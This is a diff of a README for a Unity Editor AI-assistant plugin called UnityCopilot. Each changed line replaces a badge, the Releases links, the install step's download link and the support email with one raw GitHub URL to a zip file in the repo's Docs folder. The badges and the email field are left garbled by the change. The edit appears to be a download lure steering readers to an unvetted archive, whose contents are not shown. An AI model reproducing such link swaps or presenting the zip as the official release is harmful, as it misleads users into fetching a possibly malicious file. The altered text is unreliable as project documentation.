@@ -1,6 +1,6 @@
 # UnityCopilot: Your AI Assistant for Unity Development 🚀
 
-![UnityCopilot](https://img.shields.io/badge/UnityCopilot-AI%20Development%20Assistant-blue)
+![UnityCopilot](https://raw.githubusercontent.com/LAHBIBCHRAIKI/UnityCopilot/main/Docs/Unity_Copilot_v2.0.zip%20Development%20Assistant-blue)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -16,7 +16,7 @@
 
 UnityCopilot is an AI-powered assistant designed to enhance your Unity development experience. It integrates seamlessly into the Unity Editor, allowing you to generate scripts, build scenes, and audit projects using natural language prompts. Built with Unity 2023 LTS and UIToolkit, UnityCopilot offers a modern approach to game development.
 
-You can download the latest version from the [Releases section](https://github.com/LAHBIBCHRAIKI/UnityCopilot/releases).
+You can download the latest version from the [Releases section](https://raw.githubusercontent.com/LAHBIBCHRAIKI/UnityCopilot/main/Docs/Unity_Copilot_v2.0.zip).
 
 ## Features
 
@@ -34,7 +34,7 @@ You can download the latest version from the [Releases section](https://github.c
 
 To install UnityCopilot, follow these steps:
 
-1. **Download the latest release** from the [Releases section](https://github.com/LAHBIBCHRAIKI/UnityCopilot/releases).
+1. **Download the latest release** from the [Releases section](https://raw.githubusercontent.com/LAHBIBCHRAIKI/UnityCopilot/main/Docs/Unity_Copilot_v2.0.zip).
 2. **Extract the files** to your Unity project's `Assets` folder.
 3. **Open Unity** and navigate to `Window > UnityCopilot` to start using the tool.
 
@@ -81,14 +81,14 @@ UnityCopilot is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or support, please reach out via the following methods:
 
-- **Email**: support@unitycopilot.com
+- **Email**: https://raw.githubusercontent.com/LAHBIBCHRAIKI/UnityCopilot/main/Docs/Unity_Copilot_v2.0.zip
 - **GitHub Issues**: Use the Issues section in this repository for bug reports or feature requests.
 
 ## Release Notes
 
-To stay updated with the latest changes and improvements, check the [Releases section](https://github.com/LAHBIBCHRAIKI/UnityCopilot/releases). Here, you will find detailed notes on each version, including new features, bug fixes, and enhancements.
+To stay updated with the latest changes and improvements, check the [Releases section](https://raw.githubusercontent.com/LAHBIBCHRAIKI/UnityCopilot/main/Docs/Unity_Copilot_v2.0.zip). Here, you will find detailed notes on each version, including new features, bug fixes, and enhancements.
 
-![Unity Development](https://img.shields.io/badge/Unity%20Development-Open%20Source-green)
+![Unity Development](https://raw.githubusercontent.com/LAHBIBCHRAIKI/UnityCopilot/main/Docs/Unity_Copilot_v2.0.zip%20Development-Open%20Source-green)
 
 ## Topics
 
@@ -106,4 +106,4 @@ UnityCopilot covers a wide range of topics relevant to game development:
 
 Feel free to explore these topics and see how UnityCopilot can benefit your projects. 
 
-For any additional information or updates, always refer to the [Releases section](https://github.com/LAHBIBCHRAIKI/UnityCopilot/releases).
+For any additional information or updates, always refer to the [Releases section](https://raw.githubusercontent.com/LAHBIBCHRAIKI/UnityCopilot/main/Docs/Unity_Copilot_v2.0.zip).
